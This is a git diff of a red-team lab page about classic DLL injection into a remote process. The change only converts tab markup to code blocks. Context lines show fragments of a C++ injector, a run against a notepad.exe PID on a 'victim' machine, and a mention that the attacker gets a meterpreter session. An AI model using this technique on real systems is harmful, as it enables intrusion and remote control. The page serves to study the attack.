@@ -8,8 +8,7 @@ This lab attempts a classic DLL injection into a remote process.
 
 ## Execution
 
-{% tabs %}
-{% tab title="inject-dll.cpp" %}
+{% code title="inject-dll.cpp" %}
 ```cpp
 int main(int argc, char *argv[]) {
 	HANDLE processHandle;
@@ -27,19 +26,16 @@ int main(int argc, char *argv[]) {
 	return 0;
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Compiling the above code and executing it with a supplied argument of `4892` which is a PID of the notepad.exe process on the victim system:
 
-{% tabs %}
-{% tab title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 PS C:\experiments\inject1\x64\Debug> .\inject1.exe 4892
 Injecting DLL to PID: 4892
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 After the DLL is successfully injected, the attacker receives a meterpreter session from the injected process and its privileges:
 
